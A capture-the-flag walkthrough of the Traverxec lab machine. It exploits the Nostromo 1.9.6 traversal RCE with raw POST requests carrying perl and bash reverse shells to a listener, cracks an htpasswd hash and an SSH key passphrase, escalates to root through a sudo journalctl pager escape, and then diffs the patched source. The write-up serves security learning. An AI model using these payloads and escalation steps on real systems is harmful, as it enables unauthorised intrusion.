# Traverxec
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `(unauthenticated)` | Nostromo Web Server RCE | An `nmap` scan revealed ports 22 and 80 were open. The web server on port 80 was identified as `nostromo 1.9.6`. A `searchsploit` for this version revealed a known Remote Code Execution (RCE) vulnerability. By sending a specially crafted `POST` request with a directory traversal sequence (`/.%0d./.%0d./...`) to bypass security checks and a `bash` reverse shell payload, a command shell was obtained as the `www-data` user. |
| 2 | `www-data` | Information Gathering & Password Cracking | After gaining a foothold, `linPEAS` was run to enumerate the system. It discovered a `.htpasswd` file at `/var/nostromo/conf/.htpasswd` containing credentials for a user named `david`. The password hash was cracked using `john` and a wordlist, revealing the password `Nowonly4me`. This password, however, did not grant access to the `david` user via `su`. |
| 3 | `david` | SSH Key Misconfiguration & Password Cracking | Further enumeration revealed that Nostromo's configuration file `/var/nostromo/conf/nhttpd.conf` had `homedirs` enabled. This allowed the attacker to access user directories via the web server. Navigating to `/home/david/public_www/protected-file-area/` revealed a `.tgz` archive named `backup-ssh-identity-files.tgz`. This archive contained an encrypted `id_rsa` file. The private key's passphrase was cracked using `ssh2john` and `john`, revealing the password `hunter`. Using this key and password, SSH access was gained as the `david` user. |
| 4 | `root` | Sudo Privilege Escalation via `journalctl` | After logging in as `david`, a custom script named `server-stats.sh` was found in `~/bin`. This script executed `/usr/bin/journalctl` with `sudo` and without a password. The `journalctl` binary, when its output is longer than the terminal height, invokes a pager like `less`. This `less` pager can be escaped to run arbitrary commands by typing `:!/bin/bash`. By resizing the terminal to a small size and executing the `journalctl` command from the `server-stats.sh` script, the `less` pager was triggered, allowing the attacker to get a root shell. |
| 5 | `root` | Final Flag | With a root shell obtained through the `journalctl` exploit, the final flag was retrieved. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see from the ssh banner, the machine is running Debian10. Since the only obvious path for the foothold is port 80, let's start digging into this service.  
As we can see the webserver is running using 'nostromo' wich is quite uncommon.  
Before looking into exploits, let's poke around the site and see what we can get.  
s we open the site, we can see a pretty basic template without much customization, and no features, so let's start searching exploits for nostromo.

## Foothold 
If we perform a searchsploit for nostromo, we can see the following:  
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution                                                                                                                                                                     | multiple/remote/47837.py
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                                                                                                                       | multiple/remote/47573.rb
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                                                                                                       | linux/remote/35466.sh
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```  
Since we are running nostromo 1.9.6, we have only two suitable options for exploiting the service: ```multiple/remote/47837.py``` and ```multiple/remote/47573.rb```, actually, those are different versions of the same exploit, one is running as a standalone python script, the other is a metasploit module.   
Let's dig into the metasploit module and, as always, see how the exploit works.  
Once we are into msfconsole, let's set the following parameters:  
```
sf6 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nostromo_code_exec

msf6 > use exploit/multi/http/nostromo_code_exec
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
RHOSTS => 10.10.10.165
msf6 exploit(multi/http/nostromo_code_exec) > set LHOST tun0
LHOST => 10.10.16.5
msf6 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on 10.10.16.5:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.10.165:56850 ) at 2022-03-23 10:12:02 +0100

whoami

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
As we can see, after setting the proper parameters we can pop the execution of a shell.  
Now, as always, let's analyze the script by setting proxy to localhost so that burp can intercept requests.  
As we intercept the exploit's requests, we can see the following request coming through:  
```
POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1
Host: 10.10.10.165
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36
Content-Length: 245
Content-Type: application/x-www-form-urlencoded
Content-Length: 245
Connection: close

echo
echo
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.24:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};' 2>&1
```
as we can see, we are calling this url: ```/.%0d./.%0d./.%0d./.%0d./bin/sh``` wich is triggering command execution on the remote host, and we are also using a perl reverse shell.  
Now let's change the payload a bit and see if we can trigger a shell without using metasploit.  
Let's change the request as follow:  
```
POST /.%0d./.%0d./.%0d./.%0d./bin/bash HTTP/1.1
Host: 10.10.10.165
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36
Content-Length: 51
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Connection: close

echo
echo
bash -i >& /dev/tcp/10.10.14.24/8443 0>&1
```  
As we can see, we changed the url to bash instead of sh and the payload with a commond bash reverse tcp shell, after we send the request we get a shell as user www-data:
```
root@kali:~/Documents/HTB/Boxes/Traverxec# nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.165] 37074
bash: cannot set terminal process group (419): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$
```

## User
As we login as user www-data we can run run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS notice the following:  
```
╔══════════╣ Analyzing Htpasswd Files (limit 70)                                                                      
-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd                                                    
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/         
```
While doing other recon, let's start cracking this using john:  
```
[root@kali Traverxec ]$ john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd.txt      
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)     
1g 0:00:00:32 DONE (2022-03-28 15:48) 0.03119g/s 329957p/s 329957c/s 329957C/s Noyoudo..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Unfortunately this password doesn't leads to anywhere since cannot be used for switch user.  
So, let's keep it for now and proceed with further investigations.  
As we may have noticed, this file is within ```/var/nostromo/conf/.htpasswd```, let's look in here if we can see other interesting things:  
```
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```
As we can see homedirs are allowed into the webserver, so probably this meas that www-data may have a chance to see content of user directories.  
we can navigate to:
```
www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```
The file ```backup-ssh-identity-files.tgz``` defenetly looks juicy, so let's start looking into it.  
Inside the backup archive, we can see an id_rsa file. Obviously this file is encrypted, so let's use ssh2john and john to crack the file:  
```
[root@kali .ssh ]$ ssh2john id_rsa > id_rsa_david.hash             
[root@kali .ssh ]$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_david.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)     
1g 0:00:00:00 DONE (2022-03-28 16:05) 100.0g/s 14400p/s 14400c/s 14400C/s carolina..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Now that we have a password for the key, we can use it to log in as david:  
```
[root@kali .ssh ]$ ssh -l david -i id_rsa $TARGET                  
Enter passphrase for key 'id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
david@traverxec:~$
```

## Root
As we log in we can notice inside the user folder a ```bin/``` directory which is odd.  
If we inspect the directory, we can see the following script:  
```
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
This means that user david can execute as root journalctl.  
according to [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/) we can perform a privilege escalation via journalctl pager (less).
Please notice that less won't be triggered if the terminal size is wider than the output.  
So, what we can do is reduce the window size of the terminal, trigger the pager, type ```:!/bin/bash``` and get a shell as root:  
```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Mon 2022-03-28 09:08:21 EDT, end at Mon 2022-03-28 10:11:23 EDT. --
Mar 28 09:46:24 traverxec sudo[5328]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruse
Mar 28 09:46:26 traverxec sudo[5328]: pam_unix(sudo:auth): conversation failed
Mar 28 09:46:26 traverxec sudo[5328]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Mar 28 09:46:26 traverxec sudo[5328]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COM
Mar 28 09:46:26 traverxec nologin[5381]: Attempted login by UNKNOWN on UNKNOWN
!/bin/bash
/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
root@traverxec:/home/david/bin#
```

## Forensics  
Now, let's dig deeper into nostromo vulnerability.  
Let's download nostromo 1.9.6 and nostromo 1.9.7 and calculate md5sums to check file changes:  
```
[root@kali nostromo ]$ find . -type f -exec md5sum {} \; | sort           
02008a7c46ac776ccc81335e0e8583d7  ./nostromo-1.9.6/conf/mimes            
02008a7c46ac776ccc81335e0e8583d7  ./nostromo-1.9.7/conf/mimes            
04f118886433f64a2cb5be8910df1bd5  ./nostromo-1.9.7/src/libmy/ChangeLog     
052a8c32df7f35132c8cefdd0be2bb57  ./nostromo-1.9.7/conf/CVS/Entries     
05d01129809c103e79e11ca181ab5bf0  ./nostromo-1.9.6/src/libmy/flog.c          
05d01129809c103e79e11ca181ab5bf0  ./nostromo-1.9.7/src/libmy/flog.c    
07bb349c671f30f68b1c3065286179d6  ./nostromo-1.9.7/htdocs/CVS/Entries       
0c6b86474eea6679abbd62edee84e000  ./nostromo-1.9.6/src/tools/Makefile
0c6b86474eea6679abbd62edee84e000  ./nostromo-1.9.7/src/tools/Makefile     
1131e809fe81d5fdb48fe689df6ab953  ./nostromo-1.9.7/htdocs/cgi-bin/CVS/Repository
130ee1afe8b788a0c8bdbda131fe4986  ./nostromo-1.9.7/htdocs/CVS/Repository
18afaf6f74e46fd60ecccbfd83a02f81  ./nostromo-1.9.7/src/CVS/Entries    
[... SNIP ...]
```
Now, Let's look for unique hashes, so we can see the file changed from one version to the other:
```
[root@kali nostromo ]$ find . -type f -exec md5sum {} \; | sort | awk '{print $1}' | uniq -c | grep "1 " | awk '{print $2}'
04f118886433f64a2cb5be8910df1bd5
052a8c32df7f35132c8cefdd0be2bb57
07bb349c671f30f68b1c3065286179d6
1131e809fe81d5fdb48fe689df6ab953
130ee1afe8b788a0c8bdbda131fe4986
18afaf6f74e46fd60ecccbfd83a02f81
21d89e97f3a8b7487f8822c1b48a7cef
28bf7da009f8b6bb9bb3f74d49d3ed8c
4f64c3ad8f441c85bd7d885a7cc9119d
5656d61ea1d859c6da4abab8f3246a3a
605843f406b45761936ec4a3fc47cc3d
638bf96954478ad974e769269916bfd7
642f8982c3c48c67878124798c3bb580
71c159b2792123efc5c7921f51671a8f
76ddd95f0ece29ec5e5e659fef738cbd
924bf6ee86e4af602df20aded2d8d300
965858c09d932b868fa0ec5a25b743ba
abe11208fa52c37d6b67ef530510ff6c
aec9dc618fa76f6a27bae84239546fdc
af0500f8d4f0fa7710d711bc86c99156
b6f62a866d76c8038c0f1de7e8c31725
b94c2ce3196b77930e67fe2e43e876b9
c28c52f5649e142031e38eb9b6a8e7e0
c3a321211068e0c4543d0758821e60a1
c7f4f8f91653ea668c6564d48cf81c64
c8f33e958b1a60fa0c42d4eee0c2ed46
ce87620e9fbf6e573bd3a5ee8957d813
db37db16b5e95b96f95364f42c88bfaf
ddbac1ccf56f550eeb9636423400860f
e00c8841017908f98feaad681f18028c
e696195b405e71d1f536791d6bd1b6be
e7a20793a290dbed67761b766be45455
```
Now let's grep for this hashes and remove all CVS entries:
```
[root@kali nostromo ]$ find . -type f -exec md5sum {} \; | grep -f new_files | grep -v CVS
965858c09d932b868fa0ec5a25b743ba  ./nostromo-1.9.7/htdocs/index.html
21d89e97f3a8b7487f8822c1b48a7cef  ./nostromo-1.9.7/ChangeLog
e7a20793a290dbed67761b766be45455  ./nostromo-1.9.7/src/nhttpd/http.c
aec9dc618fa76f6a27bae84239546fdc  ./nostromo-1.9.7/src/nhttpd/main.c
04f118886433f64a2cb5be8910df1bd5  ./nostromo-1.9.7/src/libmy/ChangeLog
c7f4f8f91653ea668c6564d48cf81c64  ./nostromo-1.9.7/src/libmy/strcutl.c
ddbac1ccf56f550eeb9636423400860f  ./nostromo-1.9.6/htdocs/index.html
abe11208fa52c37d6b67ef530510ff6c  ./nostromo-1.9.6/ChangeLog
76ddd95f0ece29ec5e5e659fef738cbd  ./nostromo-1.9.6/src/nhttpd/http.c
db37db16b5e95b96f95364f42c88bfaf  ./nostromo-1.9.6/src/nhttpd/main.c
642f8982c3c48c67878124798c3bb580  ./nostromo-1.9.6/src/libmy/ChangeLog
c8f33e958b1a60fa0c42d4eee0c2ed46  ./nostromo-1.9.6/src/libmy/strcutl.c
```
If we inspect the changelog we can see the following lines:
```
1.8
===
- strcutl(): take account of the '\r' character when it appears within a
  string instead of ignoring it.  Improved logic and performance diff by
  Adrian Steinmann
- strb64d(): remove variable assignment to itself (j = j)

```
now, let's check strcutl.c differences between version 1.9.6 and 1.9.7, as we can see in diff, they added a block of code for parsing ```\r``` (```%0d``` in ASCII code) differently
```
/* read requested line */                             |         /* copy the requested line to destination buffer */
for (j = 0; src[i] != '\n' && src[i] != '\0' && j !=            for (j = 0; src[i] != '\n' && src[i] != '\0' && j !=
        if (src[i] != '\r') {                         |                 if (src[i] == '\r' && src[i + 1] == '\n')
                dst[j] = src[i];                      |                         continue;
                j++;                                  |                 dst[j] = src[i];
        }                                             |                 j++;
}                                                               }
```
Actually this function is processing a line and reading it character by character, in the snippet on the left says do nothing, instead the code on the left stop processing the line.   
